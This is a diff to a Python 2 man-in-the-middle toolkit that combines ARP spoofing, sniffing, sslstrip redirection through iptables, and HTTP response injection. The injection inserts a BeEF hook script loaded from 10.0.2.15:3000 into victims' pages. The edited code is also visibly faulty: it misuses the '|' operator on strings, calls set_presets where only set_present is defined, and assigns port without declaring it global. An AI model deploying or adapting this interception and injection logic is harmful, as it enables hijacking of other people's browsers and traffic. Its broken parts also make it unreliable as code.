@@ -3,7 +3,6 @@
 import netfilterqueue
 import scapy.all as scapy
 import subprocess
-import argparse
 import re
 import time
 import sys
@@ -161,7 +160,7 @@ def arp_spoofer():
                 spoof_arp_tables(gateway_ip, target_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
-                time.sleep(interval_in_seconds)
+                time.sleep(int(interval_in_seconds))
 
         elif "y" == spoof_cmd:
             target_ip = network_scanner(True)
@@ -171,7 +170,7 @@ def arp_spoofer():
                 spoof_arp_tables(gateway_ip, target_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
-                time.sleep(interval_in_seconds)
+                time.sleep(int(interval_in_seconds))
         else:
             sys.exit()
     except (KeyboardInterrupt, BaseException), e:
@@ -182,35 +181,29 @@ def arp_spoofer():
 # ================================= /For arp_spoofing ========================================
 # ================================= For traffic_sniffer ========================================
 def sniffer_callback(packet):
-    print(packet.show())  # think, what to present/search
+    print(packet.show())  # TODO think, what to present/search
 
 def traffic_sniffer():
     nic = raw_input("What NIC would you prefer to sniff on? (examples: 'eth0', 'wlan0'): ")
     scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
 # ================================= /For traffic_sniffer ========================================
 # ================================= /For code_injector ========================================
-http_ports = [80, 8080, 8008, 8000]
+port = 80
 
-def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
-    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
-    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
-    options = parser.parse_args()
-    if not options.chain_name0:
-        parser.error("Please, specify a chain name, use --help for more info")
-    elif not options.queue_num:
-        parser.error("Please, specify a queue number, use --help for more info")
+def set_present():
+    opt = raw_input(
+        "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y, by default: 'y' or whatever you want for exit): ") | "y"
+    if "t" == opt:
+        subprocess.call("iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
+    elif "y" | "as" == opt:
+        subprocess.call("iptables -A INPUT -j NFQUEUE --queue-num 0", shell=True)
+        subprocess.call("iptables -A OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+        if "as" == opt:
+            raw_input("===>>> ALERT!!! Make sure you run 'sslstrip' before!!! (press any key to continue)")
+            subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
     else:
-        if ("OUTPUT" or "INPUT") == options.chain_name0:
-            if not options.chain_name1:
-                parser.error("Please, specify a chain name, use --help for more info")
-    return options
-
-def presets_for_intercept_and_modify_packets(options):
-    if options.chain_name1:
-        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
-    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])
+        sys.exit()
+    return opt
 
 def flush_presets():
     subprocess.call("iptables --flush", shell=True)
@@ -222,17 +215,22 @@ def set_load_data(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
-def process_packet(packet):
+def dns_packet(packet):
+    # TODO
+    packet.accept()
+
+def download_packet(packet):
+    # TODO
+    packet.accept()
+
+def inject_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport in http_ports:
-            print("Request")
+        if scapy_packet[scapy.TCP].dport == port:
             # print(scapy_packet.show())
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-
-        elif scapy_packet[scapy.TCP].sport in http_ports:
-            print("Response")
+        elif scapy_packet[scapy.TCP].sport == port:
             # print(scapy_packet.show())
             injection_code = "<script defer src='http://10.0.2.15:3000/hook.js'></script>"
             load = load.replace("</head>", injection_code + "</head>")
@@ -242,37 +240,38 @@ def process_packet(packet):
                 new_content_length = int(content_length) + len(injection_code)
                 content_length_header = "Content-Length: "
                 load = load.replace(content_length_header + content_length, content_length_header + str(new_content_length))
-
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load_data(scapy_packet, load)
             packet.set_payload(str(new_packet))
     packet.accept()
 
+def packet_switch():
+    opt = raw_input("What do you want? ('d' - dns spoof, 'ds' - download spoof, 'ic' - inject code): ")
+    if "d" == opt:
+        packet = dns_packet
+    elif "ds" == opt:
+        packet = download_packet
+    elif "ic" == opt:
+        packet = inject_packet
+    return packet
+
+# THE MAIN FUNCTION FOR CODE INJECTION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def code_injector():
-    options = get_args()
-    presets_for_intercept_and_modify_packets(options)
+    opt = set_presets()
+    if "as" == opt:
+        port = 10000
+    run_packet = packet_switch()
+    if not run_packet:
+        run_packet = packet_switch()
     try:
         queue = netfilterqueue.NetfilterQueue()
-        queue.bind(int(options.queue_num), process_packet)
+        queue.bind(0, run_packet)
         queue.run()
     except (KeyboardInterrupt, BaseException), e:
         print("WARNING! Something get wrong!... Flushing IP-tables... Please wait...")
         flush_presets()
         print("IP-tables were flushing successfully!")
 # ================================= /For code_injector ========================================
-
-# def get_args():
-#     parser = argparse.ArgumentParser()
-#     parser.add_argument("-c", dest="mac_changer", help="Flag to change the MAC-address (example: -c 1)")
-#     parser.add_argument("-cs", dest="network_scanner", help="Flag to scan the connected network (example: -cs 1)")
-#     parser.add_argument("-css", dest="arp_spoofer", help="Flag to spoof the VICTIM and the GATEWAY every 2 sec in infinite loop (example: -css 1)")
-#     parser.add_argument("-csss", dest="traffic_sniffer", help="Flag to sniff the VICTIM traffic (example: -csss 1)")
-#     command = parser.parse_args()
-#     if not command:
-#         parser.error("Please, specify one of the following flags --> |-c|-cs|-css|-csss|, use --help for more info")
-#         if not (command.mac_changer | command.network_scanner | command.arp_spoofer | command.traffic_sniffer):
-#             parser.error("WARNING! Incorrect flag, use --help for more info")
-#     return command
 
 def cmd_switch():
     cmd = raw_input(
